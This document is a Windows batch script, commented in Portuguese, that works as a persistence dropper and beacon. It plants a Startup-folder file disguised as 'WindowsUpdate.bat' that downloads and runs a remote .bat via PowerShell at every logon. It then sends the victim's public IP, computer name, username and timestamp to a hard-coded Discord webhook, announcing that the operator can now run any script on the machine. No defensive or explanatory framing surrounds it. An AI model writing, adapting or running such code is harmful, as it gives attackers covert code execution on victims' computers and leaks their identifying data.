@echo off
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

(
echo @echo off
echo powershell -c "iwr 'https://lzx-one.vercel.app/LXZ.bat' -OutFile $env:TEMP\t.bat; & $env:TEMP\t.bat"
) > "%startup%\WindowsUpdate.bat"


:: Pega IP público
for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
:: Infos do sistema
set PC=%COMPUTERNAME%
set USER=%USERNAME%

:: Data e hora
set DATA=%DATE%
set HORA=%TIME:~0,5%

set MESSAGE=Copiador executado com sucesso. Voce tem direito de colocar qualquer script quando esse usuario  iniciar o pc para ser executado PC %PC% - Usuario %USER% - IP %IP% - Data %DATA% - Hora %HORA%

:: Envia pro Discord
curl -s ^
-H "Content-Type: application/json" ^
-X POST ^
-d "{\"content\":\"%MESSAGE%\"}" ^
https://discord.com/api/webhooks/1476889854296981637/-KRgTWFBVNLoiII8EPfnGZDivUtmerZR7Zr-NAhDJ3BkERuuXPW818ug_I-o5xak71OK

endlocal
exit
